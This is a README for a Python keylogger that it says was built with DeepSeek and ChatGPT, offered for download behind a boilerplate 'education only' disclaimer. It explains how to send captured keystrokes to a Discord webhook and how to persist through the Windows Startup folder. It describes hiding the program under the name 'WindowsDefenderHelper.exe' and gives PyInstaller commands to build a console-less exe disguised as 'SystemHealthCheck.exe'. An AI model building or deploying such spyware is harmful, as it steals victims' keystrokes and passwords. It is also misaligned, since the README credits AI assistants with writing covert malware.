# pyhon-keylogger

This is a good keylogger that is simple and customizable, made by deepseek &amp; chatgpt.

This keylogger is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the source code/any files provided. The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of ANY files provided with this program. By using this program or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again this file and ALL files included are for EDUCATION and/or RESEARCH purposes ONLY. This file is ONLY intended to be used on your own pentesting labs, or with explicit consent from the owner of the property being tested

-------------YOU MUST HAVE PYTHON INSTALLED IN ORDER FOR THE INSTALATION TO BE SUCCESFULL----------------

INSTALATION TUTORIAL:

====== CONFIGURATION ======

WEBHOOK_URL = "YOUR_DISCORD_URL"   -  YOU HAVE TO CHANGE IT TO YOUR WEBHOOK!

SEND_INTERVAL = 60  - SET THE TIME OF REPORT TO YOUR LIKING (in seconds)

HOW IT WORKS:

1. It imports all requirements once opened (i hope so)

2. It starts to log all the keys pressed when the program is active

3. The file creates a copy of itself and puts it in windows autostart folder (Microsoft\\Windows\\Start Menu\\Programs\\Startup)

4. The copy is hidden and is automatically renamed to "WindowsDefenderHelper.exe" so it isnt suspicious

--note that this file is intended to work as a .exe file--

====== TURNING THE FILE TO .EXE (DO THIS OR IT WILL NOT WORK) ======

Step 1. Download keylogger.py

Step 2. Put it in a folder

Step 3. Copy the directory of the file

Step 4. Open PowerShell

Step 5. --IN POWERSHELL-- write: pip install pyinstaller

Step 6. --IN POWERSHELL-- write: cd (keylogger file directory)

Step 7. --IN POWERSHELL-- write: pyinstaller --onefile --noconsole --clean --icon=default.ico --name "SystemHealthCheck.exe" keylogger.py

Step 8. IN THE KEYLOGGER FOLDER THERE SHOULD APPEAR A FEW NEW FOLDERS, OPEN THE ONE NAMED "dist" AND COPY THE .EXE file from it

Step 9. THE COPIED .EXE FILE IS READY TO USE

Step 10. (OPTIONAL) YOU CAN RENAME THE .EXE FILE TO WHATEVER YOU WANT

Step 11. (OPTIONAL) IF YOU WANT TO CHANGE THE .EXE ICON YOU CAN FOLLOW THIS TUTORIAL (not mine): https://www.youtube.com/watch?v=1jZt6m_SkDs

====== THATS ALL ======

Feel free to contribute to fix any problems, or to submit an issue!
